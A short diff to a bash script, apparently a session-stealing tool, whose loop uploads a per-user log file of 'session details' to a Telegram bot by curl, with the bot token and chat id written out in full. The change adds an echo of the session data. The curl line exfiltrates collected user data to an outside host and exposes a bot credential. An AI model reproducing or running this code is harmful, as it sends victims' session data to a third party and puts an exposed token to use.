@@ -29,6 +29,7 @@ while true; do
         curl -s -X POST "https://api.telegram.org/bot7304255419:AAEaB_c4vQeqO_aZtGukacDRC8RY-_GjQNE/sendDocument" \
         -F chat_id=1700631357 \
         -F document=@"$(whoami).log"
+        echo $session_details
         printf "Successfully sent session details\n"
 
         break
@@ -40,6 +41,8 @@ while true; do
 done
 
 wait
+
+
 
 
 
